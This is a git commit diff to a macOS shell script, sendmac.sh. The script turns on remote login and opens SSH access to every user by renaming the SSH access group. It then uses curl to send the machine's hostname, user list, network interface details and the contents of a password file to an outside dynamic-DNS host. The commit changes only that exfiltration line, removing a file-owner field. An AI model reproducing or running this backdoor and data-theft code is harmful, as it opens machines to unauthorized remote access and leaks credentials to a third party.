8170d19c5d42452e8cdcdfc9c8e67a366893dc1c
matthewpipie <matthewpipie@gmail.com>
2017-04-06 13:20:33 -0500

    Update sendmac.sh

--- sendmac.sh
+++ sendmac.sh
@@ -5,4 +5,4 @@ sudo systemsetup -f -setremotelogin on
 #give ssh access to every user
 dscl . change /Groups/com.apple.access_ssh RecordName com.apple.access_ssh com.apple.access_ssh-disabled
 #send info
-curl "pipie.ddns.net:23232" -d "localhostname=$(/usr/sbin/scutil --get LocalHostName | base64 | tr -- '+=/' '-_~')\&users=$(dscl . list /Users | grep -v '^_' | base64 | tr -- '+=/' '-_~')\&ifconfig=$(/sbin/ifconfig | base64 | tr -- '+=/' '-_~')\&pwd=$(cat /etc/.pwd.txt)\&owner=$(ls -lg /etc/.pwd.txt | base64 | tr -- '+=/' '-_~')"
+curl "pipie.ddns.net:23232" -d "localhostname=$(/usr/sbin/scutil --get LocalHostName | base64 | tr -- '+=/' '-_~')\&users=$(dscl . list /Users | grep -v '^_' | base64 | tr -- '+=/' '-_~')\&ifconfig=$(/sbin/ifconfig | base64 | tr -- '+=/' '-_~')\&pwd=$(cat /etc/.pwd.txt)"
